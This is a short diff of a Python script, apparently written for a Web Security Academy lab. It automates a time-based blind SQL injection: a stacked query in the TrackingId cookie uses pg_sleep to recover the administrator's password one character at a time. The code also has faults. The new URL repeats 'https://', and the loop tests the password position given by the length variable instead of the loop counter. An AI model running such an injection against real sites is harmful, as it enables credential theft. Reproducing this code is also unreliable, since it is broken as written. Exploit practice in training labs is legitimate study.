@@ -3,7 +3,7 @@
 import requests
 from time import sleep
 from bs4 import BeautifulSoup
-url = "https://ac921f2c1f5a7ed8c0293c330025003a.web-security-academy.net/filter?category=Food+%26+Drink"
+url = "https://https://ac2e1f941e1adcf9c02881a900a3004b.web-security-academy.net/login"
 s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 number = 1
 session = requests.Session()
@@ -23,7 +23,7 @@ print("length of admin password found = "+str(number))
 password = ""
 for num in range(1,number+1):
     for letter in s:
-        trackingID = track + "\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+SUBSTRING(password,"+str(number)+",1)='"+letter+""')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+        trackingID = track + "\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+SUBSTRING(password,"+str(number)+",1)='"+letter+"')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
         response = requests.get(url, cookies={'TrackingId': trackingID})
         if response.elapsed.seconds > 9:
             print(letter)
